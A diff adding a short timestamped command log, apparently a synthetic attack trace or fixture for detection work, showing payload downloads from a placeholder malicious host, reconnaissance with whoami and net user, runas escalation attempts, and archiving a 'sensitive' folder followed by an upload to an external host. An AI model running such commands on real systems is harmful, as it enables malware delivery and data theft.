@@ -1,0 +1,10 @@
+2026-11-15T05:24:04.957135 | powershell Invoke-WebRequest http://malicious-site.com
+2026-11-15T05:24:04.957135 | curl http://malicious-site.com/payload.exe
+2026-11-15T05:29:04.957135 | whoami
+2026-11-15T05:29:04.957135 | net user
+2026-11-15T05:29:04.957135 | runas /user:administrator cmd
+2026-11-15T05:34:04.957135 | whoami
+2026-11-15T05:34:04.957135 | net user
+2026-11-15T05:34:04.957135 | runas /user:administrator cmd
+2026-11-15T05:44:04.957135 | tar -czf data.tar.gz sensitive/
+2026-11-15T05:44:04.957135 | curl -X POST https://external-host/upload
